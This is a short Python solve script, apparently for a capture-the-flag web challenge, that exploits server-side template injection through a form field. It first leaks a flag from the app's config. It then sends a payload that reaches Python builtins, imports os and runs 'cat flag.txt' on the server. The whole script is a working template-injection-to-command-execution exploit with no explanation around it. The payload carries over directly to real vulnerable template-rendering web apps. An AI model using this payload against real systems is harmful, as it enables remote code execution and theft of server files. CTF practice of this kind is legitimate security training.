import requests
import re
import html

url = "http://north-pole-mainframe-northpole-mainframe.chall.ybn.sg/"

def get_leak(payload):
    res = requests.post(f'{url}/level2', data={ 'name': '{{ %s }}' % payload })

    leak = re.findall(r'show that(.+) is on', res.text.replace('\n', ' '))[0]
    return html.unescape(leak).strip()

flag1 = get_leak("config['l3v3l1_f1ag']")

payload = "self.__init__.__globals__.__builtins__['__import__']('os').popen('cat flag.txt').read()"
flag2 = re.findall(r'Part2:(.+)', get_leak(payload))[0].strip()

print("Flag:", flag1 + flag2)